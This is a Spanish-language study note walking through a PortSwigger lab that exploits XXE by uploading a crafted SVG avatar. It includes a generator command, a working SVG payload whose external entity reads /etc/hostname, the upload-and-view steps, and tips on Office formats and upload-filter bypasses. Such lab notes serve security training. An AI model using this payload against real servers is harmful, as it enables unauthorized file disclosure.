---
aliases:
  - XXE 004 - subida de SVG
  - xxe file upload svg
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 004 — XXE por subida de imagen (SVG)

> Lab: [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]] · relación → [[vulnerabilities/017-file-upload-vulnerabilities/README|file upload]]

## ¿Por qué acá?
- **Vengo de 001/003:** la entrada era un **body/param** que llegaba a un parser XML.
- **Qué cambia:** acá la entrada es una **imagen** (upload de avatar), no un campo de texto.
- **Por qué funciona igual:** un **SVG es XML** → el procesador de imágenes lo parsea → el mismo XXE clásico, pero **dentro del SVG**.

## Cómo explotarlo
> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).

Generá el SVG con el script (recurso parametrizable) → [[vulnerabilities/006-xxe/scripts/README|scripts/gen_svg_xxe.py]]:
<pre class="payload"><code>python gen_svg_xxe.py -r <mark>file:///etc/hostname</mark> -o xxe.svg</code></pre>
Produce:
<pre class="payload"><code>&lt;?xml version="1.0" standalone="yes"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "<mark>file:///etc/hostname</mark>" &gt; ]&gt;
&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
  &lt;text font-size="16" x="0" y="16"&gt;<mark>&amp;xxe;</mark>&lt;/text&gt;
&lt;/svg&gt;</code></pre>

**Flujo:**
1. Postear un comentario **subiendo `xxe.svg` como avatar**.
2. Volver al comentario → el avatar renderizado **muestra el `/etc/hostname`**.
3. Si no se ve directo, abrí la URL de la imagen (`/files/avatars/xxe.svg`).

## Verificación
El texto del SVG muestra el hostname en vez de quedar vacío.

## Detalles que se pasan por alto
- **El `&xxe;` va dentro de un `<text>`** para que se renderice visible; sin un elemento que lo muestre, se resuelve pero no lo ves.
- Misma idea con **DOCX/XLSX/PPTX** (ZIP con XML adentro) y cualquier procesador que parsee XML.
- Si filtran `.svg` por extensión/`Content-Type` → bypasses de [[vulnerabilities/017-file-upload-vulnerabilities/README|file upload]].

→ **Siguiente:** hasta acá **la respuesta reflejaba** el resultado. ¿Y si deja de reflejar? → [[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005 — XXE ciego]].
